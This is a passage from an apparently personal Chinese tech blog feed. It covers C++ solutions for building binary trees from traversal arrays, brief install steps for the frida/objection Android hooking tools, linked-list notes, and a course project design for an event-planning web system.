TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">buildTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; preorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder)</span> </span>&#123;<br>        <span class="hljs-comment">// 先序遍历的为空说明所有节点已经遍历完成</span><br>        <span class="hljs-keyword">if</span> (preorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        &#125;<br>        <span class="hljs-comment">// 取先序数组的第一个元素作为根节点</span><br>        <span class="hljs-type">int</span> value = preorder[<span class="hljs-number">0</span>];<br>        TreeNode * ansTree = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(value);<br>        <span class="hljs-keyword">if</span> (preorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-comment">// 叶子节点</span><br>            <span class="hljs-keyword">return</span> ansTree;<br>        &#125;<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (; index &lt; preorder.<span class="hljs-built_in">size</span>() ; ++index)&#123;<br>            <span class="hljs-keyword">if</span> (inorder[index] == value) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// 切割中序数组,左闭右开</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; inorderLeft = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>() , inorder.<span class="hljs-built_in">begin</span>() + index);<br>        vector&lt;<span class="hljs-type">int</span>&gt; inorderRight = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>() + index + <span class="hljs-number">1</span>,inorder.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-comment">// 通过切割出来的中序数组大小去切割先序数组,左闭右开</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; preorderLeft = <span class="hljs-built_in">vector</span>(preorder.<span class="hljs-built_in">begin</span>() + <span class="hljs-number">1</span>, preorder.<span class="hljs-built_in">begin</span>() + inorderLeft.<span class="hljs-built_in">size</span>() + <span class="hljs-number">1</span>);<br>        vector&lt;<span class="hljs-type">int</span>&gt; preorderRight = <span class="hljs-built_in">vector</span>(preorder.<span class="hljs-built_in">begin</span>() + inorderLeft.<span class="hljs-built_in">size</span>() + <span class="hljs-number">1</span>,preorder.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-comment">// 通过新的数组构建子树</span><br>        ansTree-&gt;left = <span class="hljs-built_in">buildTree</span>(preorderLeft,inorderLeft);<br>        ansTree-&gt;right = <span class="hljs-built_in">buildTree</span>(preorderRight,inorderRight);<br>        <span class="hljs-keyword">return</span> ansTree;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/2024/06/01/%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E6%A0%91/Snipaste_2024-06-01_14-33-35.png"></p><h3 id="后序遍历-中序遍历构造"><a href="#后序遍历-中序遍历构造" class="headerlink" title="后序遍历+中序遍历构造"></a>后序遍历+中序遍历构造</h3><p>本题为leetcode-106</p><p>在后序遍历中，我们可以知道顺序为：左、右、中</p><p>在中序遍历中，我们可以知道顺序为：左、中、右</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">inorder = [<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">7</span>];<br>postorder = [<span class="hljs-number">9</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">20</span>,<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>如上两个数组，我们可以发现后序数组的最后一个元素3就是根节点的数据，那么根据这个根节点的数据，我们可以在中序数组中分割出两个子数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">inorderLeft = [<span class="hljs-number">9</span>];<br>inorderRight = [<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">7</span>];<br></code></pre></td></tr></table></figure><p>接着，我们发现在后序数组中，不能直接分割出前面的左右两部分，需要借助分割出的中序数组来帮助我们分割后序数组，即通过新的两个中序数组的大小，我们可以在后序数组中找出左右子树的区间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">postorderLeft = [<span class="hljs-number">9</span>];<br>postorderRight = [<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">20</span>];<br></code></pre></td></tr></table></figure><p>然后递归左子树和右子树即可。</p><p>完整代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">buildTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; postorder)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (postorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> value = postorder[postorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>];<br>        TreeNode * ansTree = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(value);<br>        <span class="hljs-comment">// 找到中序数组分割点</span><br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( ; index &lt; inorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; ++index)<br>        &#123;<br>            <span class="hljs-keyword">if</span> ( inorder[index] == value ) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// 分割中序数组</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; inorderLeft = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>(), inorder.<span class="hljs-built_in">begin</span>() + index);<br>        vector&lt;<span class="hljs-type">int</span>&gt; inorderRight = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>() + index + <span class="hljs-number">1</span>, inorder.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-comment">// 分割后序数组</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; postorderLeft = <span class="hljs-built_in">vector</span>(postorder.<span class="hljs-built_in">begin</span>() ,postorder.<span class="hljs-built_in">begin</span>() + inorderLeft.<span class="hljs-built_in">size</span>());<br>        vector&lt;<span class="hljs-type">int</span>&gt; postorderRight = <span class="hljs-built_in">vector</span>(postorder.<span class="hljs-built_in">begin</span>() + inorderLeft.<span class="hljs-built_in">size</span>() , postorder.<span class="hljs-built_in">end</span>() - <span class="hljs-number">1</span>);<br>        ansTree-&gt;left = <span class="hljs-built_in">buildTree</span>(inorderLeft,postorderLeft);<br>        ansTree-&gt;right = <span class="hljs-built_in">buildTree</span>(inorderRight,postorderRight);<br>        <span class="hljs-keyword">return</span> ansTree;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="编码细节"><a href="#编码细节" class="headerlink" title="编码细节"></a>编码细节</h3><p>在分割区间时，必须要同一格式，这里我采用的是左闭右开形式。对于vector数组在构造时，是默认左闭右开构造的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-comment">// 分割中序数组</span><br>vector&lt;<span class="hljs-type">int</span>&gt; inorderLeft = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>(), inorder.<span class="hljs-built_in">begin</span>() + index); <span class="hljs-comment">// 不包含inroder.begin() + index</span><br>vector&lt;<span class="hljs-type">int</span>&gt; inorderRight = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>() + index + <span class="hljs-number">1</span>, inorder.<span class="hljs-built_in">end</span>());<span class="hljs-comment">// 不包含inorder.end()</span><br></code></pre></td></tr></table></figure><h3 id="前序数组和后序数组不能完成构造"><a href="#前序数组和后序数组不能完成构造" class="headerlink" title="前序数组和后序数组不能完成构造"></a>前序数组和后序数组不能完成构造</h3><p>没有中序遍历无法确定左右部分，也就是无法分割。</p><p><img src="/2024/06/01/%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E6%A0%91/Snipaste_2024-06-01_14-43-07.png"></p><p>tree1 的前序遍历是[1 2 3]， 后序遍历是[3 2 1]。</p><p>tree2 的前序遍历是[1 2 3]， 后序遍历是[3 2 1]。</p><p>那么tree1 和 tree2 的前序和后序完全相同，这是一棵树么，很明显是两棵树！</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安装frida-objection-Android的hook框架</title>
    <link href="/2024/05/21/%E5%AE%89%E8%A3%85frida-objection-Android%E7%9A%84hook%E6%A1%86%E6%9E%B6/"/>
    <url>/2024/05/21/%E5%AE%89%E8%A3%85frida-objection-Android%E7%9A%84hook%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<p>学一点安卓逆向吧</p><span id="more"></span><h3 id="安装Python相关包"><a href="#安装Python相关包" class="headerlink" title="安装Python相关包"></a>安装Python相关包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install frida==12.8.0<br>pip install frida-tools==5.4.0<br>pip install objection==1.8.4<br></code></pre></td></tr></table></figure><p><img src="/2024/05/21/%E5%AE%89%E8%A3%85frida-objection-Android%E7%9A%84hook%E6%A1%86%E6%9E%B6/Snipaste_2024-05-21_14-31-06.png"></p><h3 id="下载frida-server"><a href="#下载frida-server" class="headerlink" title="下载frida-server"></a>下载frida-server</h3><p><a href="https://github.com/frida/frida/releases?expanded=true&page=6&q=12">Github仓库</a></p><p>通过<code>adb</code>将<code>frida-server</code>安装到模拟机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb push frida-server-12.8.0-android-x86 /data/local/tmp<br></code></pre></td></tr></table></figure><h3 id="安装adb"><a href="#安装adb" class="headerlink" title="安装adb"></a>安装adb</h3><p><code>adb</code>用于在局域网中操作Android设备</p><p><a href="https://blog.csdn.net/x2584179909/article/details/108319973">参考博客文章</a></p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法之数据结构</title>
    <link href="/2024/05/14/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <url>/2024/05/14/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<p>我一定要学会数据结构😭</p><p>参考Carl哥的<a href="https://programmercarl.com/">代码随想录</a></p><span id="more"></span><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><h4 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h4><p>包含指针域和数据域，指针域会消耗一部分存储空间。</p><p>引入头节点的好处：头节点中存放第一个数据节点的指针，使得第一个数据节点的操作和其他数据节点一样；链表为空时，头节点的指针域为空，使得空表和非空表的处理得到统一。</p><p>链表是通过指针域的指针链接在内存中各个节点。所以链表中的节点在内存中不是连续分布的 ，而是散乱分布在内存中的某地址上，分配机制取决于操作系统的内存管理。</p><p>单链表（线性表的一种存储方式）</p><p><img src="/2024/05/14/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/Snipaste_2024-05-14_13-00-12.png"></p><p>双向链表（有前驱和后继两个指针）</p><p><img src="/2024/05/14/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/Snipaste_2024-05-14_13-02-23.png"></p><p>循环链表（尾节点的后继指针指向第一个数据节点）</p><p><img src="/2024/05/14/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/Snipaste_2024-05-14_13-02-46.png"></p><p>单链表的定义：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ListNode</span>&#123;<br>    <span class="hljs-type">int</span> val;<br>    ListNode *next;<br>    <span class="hljs-built_in">ListNode</span>(<span class="hljs-type">int</span> x) : <span class="hljs-built_in">val</span>(x), <span class="hljs-built_in">next</span>(<span class="hljs-literal">NULL</span>) &#123;&#125;  <span class="hljs-comment">// 节点的构造函数</span><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><p><strong>单链表</strong></p><p>增加节点：</p><ol><li>新节点后继指针指向插入位置的后一个节点</li><li>插入位置的前一个节点指针指向新节点</li></ol><p><img src="/2024/05/14/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/Snipaste_2024-05-14_13-11-55.png"></p><p>删除节点：</p><ol><li>找到删除节点的前一个节点n1</li><li>将n1的后继指针指向删除节点的后继节点</li><li>释放删除节点内存</li></ol><p><img src="/2024/05/14/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/Snipaste_2024-05-14_13-16-41.png"></p><p><strong>双向链表</strong></p><p>增加节点：新节点s，插入位置的前一个节点p，插入位置的后一个节点r</p><ol><li>s-&gt;next &#x3D; r</li><li>p-&gt;next-&gt;prior &#x3D; s</li><li>s-&gt;prior &#x3D; p</li><li>p-&gt;next &#x3D; s</li></ol><p>上面的步骤可以交换，但是4必须在12之后</p><p><img src="/2024/05/14/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/Snipaste_2024-05-14_13-28-06.png"></p><p>删除节点：删除节点s，删除位置的前一个节点p</p><ol><li>p-&gt;next &#x3D; s-&gt;next</li><li>s-&gt;next-&gt;prior &#x3D; p</li></ol><p><img src="/2024/05/14/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/Snipaste_2024-05-14_13-36-27.png"></p><p><strong>循环链表</strong></p><p>和单链表一样，不过是尾节点的后继指针指向首节点</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软工课设开发实录</title>
    <link href="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/"/>
    <url>/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>软件工程课程设计开发实录——苦逼队长版</p><span id="more"></span><h2 id="活动安排规划系统"><a href="#活动安排规划系统" class="headerlink" title="活动安排规划系统"></a>活动安排规划系统</h2><p>​活动安排规划系统旨在帮助用户有效管理、规划和安排各类活动，如会议、展览、庆典、答辩或面试等。通过本系统，用户可以轻松创建活动、设定活动细节、邀请参与者、管理活动日程，以及进行活动后的总结与反馈。</p><p>​系统是一个基于<code>Web</code>的活动安排规划平台，通过友好的用户界面和强大的后台管理功能，满足用户从活动筹备到活动结束的全程管理需求。系统支持多用户协作，提供活动权限控制，确保活动信息的准确性和安全性。</p><h3 id="工期-工作"><a href="#工期-工作" class="headerlink" title="工期&amp;工作"></a>工期&amp;工作</h3><h4 id="第一周"><a href="#第一周" class="headerlink" title="第一周"></a>第一周</h4><p>确定开发人员：</p><p>确定工种：后端开发人员2名、前端开发人员2名、测试人员1名</p><p>需求分析：</p><ol><li>画出E-R图</li><li>前后端主要API分析</li><li>技术选型</li></ol><h4 id="第二周"><a href="#第二周" class="headerlink" title="第二周"></a>第二周</h4><p>完善需求分析</p><p>进行初步开发，前后端同时进行。</p><p>后端采用SpringBoot+MySQL技术栈，前端采用Vue.js技术栈</p><p>开发任务——后端：</p><ol><li>初步完成用户登录注册以及验证码模块的开发。后续可能会加入其他策略</li><li>初步完成活动创建子模块开发</li><li>完善数据库设计，初步对接后端测试</li></ol><p>开发任务——前端：</p><ol><li>完成用户登录注册页面试图设计和接口</li><li>初步设计管理系统内部视图——活动列表，用户个人信息，报销审核列表，某个活动内部试图等等。Web接口交互暂时不用，设计试图即可。</li></ol><h4 id="第三周"><a href="#第三周" class="headerlink" title="第三周"></a>第三周</h4><p>后端开发人员完善需求分析并产出需求分析报告</p><p>开发任务——后端：</p><ol><li>完成用户登陆注册模块开发</li><li>活动创建模块开发</li></ol><p>开发任务——前端：</p><ol><li>继续做页面</li><li>配合后端以及测试人员调试接口</li></ol><h4 id="第四周"><a href="#第四周" class="headerlink" title="第四周"></a>第四周</h4><p>开发</p><h3 id="确定工种"><a href="#确定工种" class="headerlink" title="确定工种"></a>确定工种</h3><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/Snipaste_2024-04-25_15-05-04.png"></p><h3 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h3><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/Snipaste_2024-04-25_14-26-11.png"></p><h4 id="E-R图"><a href="#E-R图" class="headerlink" title="E-R图"></a>E-R图</h4><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/E-R%E5%9B%BE.jpg"></p><h4 id="对象模型"><a href="#对象模型" class="headerlink" title="对象模型"></a>对象模型</h4><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/Snipaste_2024-05-09_15-50-50.png"></p><h4 id="系统流程图"><a href="#系统流程图" class="headerlink" title="系统流程图"></a>系统流程图</h4><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/%E7%B3%BB%E7%BB%9F%E6%B5%81%E7%A8%8B%E5%9B%BE.png"></p><h4 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a>数据流图</h4><h5 id="登陆-注册数据流图"><a href="#登陆-注册数据流图" class="headerlink" title="登陆&amp;注册数据流图"></a>登陆&amp;注册数据流图</h5><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/%E7%99%BB%E9%99%86%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.png"></p><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/%E6%B3%A8%E5%86%8C%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.png"></p><h5 id="活动创建数据流图"><a href="#活动创建数据流图" class="headerlink" title="活动创建数据流图"></a>活动创建数据流图</h5><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/%E6%B4%BB%E5%8A%A8%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.png"></p><h5 id="参与者数据流图"><a href="#参与者数据流图" class="headerlink" title="参与者数据流图"></a>参与者数据流图</h5><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/%E5%8F%82%E4%B8%8E%E8%80%85%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.png"></p><h5 id="组织者数据流图"><a href="#组织者数据流图" class="headerlink" title="组织者数据流图"></a>组织者数据流图</h5><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/%E7%BB%84%E7%BB%87%E8%80%85%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.png"></p><h5 id="管理员数据流图"><a href="#管理员数据流图" class="headerlink" title="管理员数据流图"></a>管理员数据流图</h5><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/%E7%AE%A1%E7%90%86%E5%91%98%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.png"></p><h4 id="模块化分析"><a href="#模块化分析" class="headerlink" title="模块化分析"></a>模块化分析</h4><h5 id="用户管理模块"><a href="#用户管理模块" class="headerlink" title="用户管理模块"></a>用户管理模块</h5><ol><li>用户管理模块的需求主要是用户登陆和注册。</li><li>用户可以通过手机号或者邮箱注册，手机号或者邮箱作为账号唯一标识。注册时需要提供用户名、密码、手机号、邮箱</li><li>需要提供验证码功能保证账号安全，手机验证码和邮箱验证码都要可行。</li><li>可以通过安全验证后找回密码——改为填写新密码。重置密码通过发送验证码实现</li><li>用户主要分为系统管理员和普通用户。</li><li>系统管理员可以查看编辑删除所有用户，可以查看和删除活动，系统管理员也可以参与活动。</li><li>只有系统管理员可以编辑资源表。</li><li>参与者和组织者是对于某个活动而言，一个活动的组织者可以是另一个活动的参与者。一个活动只能有一个组织者。</li><li>一个活动的参与者拥有活动的所有权限，可以分配给参与者不同身份和权限。</li><li>用户可以修改自己的个人信息，这里注意鉴权，不能越权修改他人信息</li></ol><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/Snipaste_2024-05-07_15-57-58.png"></p><h5 id="活动创建与管理模块"><a href="#活动创建与管理模块" class="headerlink" title="活动创建与管理模块"></a>活动创建与管理模块</h5><ol><li><p>系统提供几款固定的模板。固定模板的基本要求：活动名，活动简介，活动角色与权限。活动内容只有通过系统管理员审核后才能上线。</p></li><li><p>可以自定义模板，目前打算实现几款固定模板，然后用户可以从所有固定模板提供的活动属性任意组合</p></li><li><p>活动创建只检测时间上的冲突，保证活动能正常创建，然后创建活动后可以灵活调整资源和地点</p></li><li><p>活动进度跟踪，活动创建成功默认为未审核状态（0），若未审核通过，变为审核未通过（-1），组织者可以查看原因整改后重新提交活动。通过管理员审核后变为筹备中（1），到活动开始时变为进行中（2），组织者可以提前结束活动也可以等活动时间结束（3）</p><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/Snipaste_2024-05-07_15-35-38.png"></p></li><li><p>活动分享，目前打算生成一个活动链接，可以跳转到活动页面。需要登陆网站后才能查看详情。</p></li></ol><h5 id="活动日程管理"><a href="#活动日程管理" class="headerlink" title="活动日程管理"></a>活动日程管理</h5><ol><li>时间轴图由前端实现，要清晰直观</li><li>冲突检测：对于参与者来说，主要是时间的检测，检测该活动对应的时间上是否已经存在其他安排；对于组织者来说，除了时间上的检测，还需要检测在活动进行的时间段内，所需的资源、地点是否存在冲突</li><li>自定义日程提醒：目前设想3种方式：发送短信，发送邮件，进入网站提醒</li></ol><h5 id="参与者管理"><a href="#参与者管理" class="headerlink" title="参与者管理"></a>参与者管理</h5><ol><li>首先在创建活动时设置了不同的角色，所以这里可以修改角色类型和权限，并且可以给用户划分角色。新的参与者默认为普通角色</li><li>关于聊天室：活动进行时默认开启一个聊天室用于交流，组织者默认为群聊管理员，可以添加新的管理员。管理员可以禁言群聊。</li></ol><h5 id="资源管理"><a href="#资源管理" class="headerlink" title="资源管理"></a>资源管理</h5><ol><li>系统管理员录入各种已有的资源，比如音响、话筒等等</li><li>活动地点也归为资源的一种</li><li>资源的自动分配：活动创建者可以预设所需资源种类，系统统计该活动时间内的可用资源，自动安排活动的资源和地点</li></ol><h5 id="预算与费用管理"><a href="#预算与费用管理" class="headerlink" title="预算与费用管理"></a>预算与费用管理</h5><ol><li>组织者可以设定预算，组织者以及其指派的人员可以使用预算并实时更新当前余额</li><li>参与者可以报销费用，提交给组织者或者其指派的人员进行审核</li></ol><h5 id="活动通知与提醒"><a href="#活动通知与提醒" class="headerlink" title="活动通知与提醒"></a>活动通知与提醒</h5><ol><li>提供多种通知模板，基本要素：标题、文本内容。不同模板体现在样式不同。</li><li>通知统计：根据发出的通知，通过接收者是否查看来统计接收情况</li></ol><h5 id="活动总结与反馈"><a href="#活动总结与反馈" class="headerlink" title="活动总结与反馈"></a>活动总结与反馈</h5><ol><li>活动报告生成：组织者主动结束活动或者活动时间到了，系统会自动反馈给组织者一个活动报告，具体包括参与人数、费用、活动评分等等</li><li>反馈意见：提供一个用户反馈窗口，参与者可以反馈活动感受给组织者，同时可以为活动打分</li></ol><h3 id="总体设计"><a href="#总体设计" class="headerlink" title="总体设计"></a>总体设计</h3><h4 id="技术架构"><a href="#技术架构" class="headerlink" title="技术架构"></a>技术架构</h4><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/%E6%8A%80%E6%9C%AF%E6%A0%88.png"></p><h4 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h4><p><img src="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/%E6%A8%A1%E5%9D%97%E8%AE%BE%E8%AE%A1.png"></p><h4 id="接口设计"><a href="#接口设计" class="headerlink" title="接口设计"></a>接口设计</h4><p>在产出的详细接口文档里🐸</p><h4 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h4><h5 id="用户表"><a href="#用户表" class="headerlink" 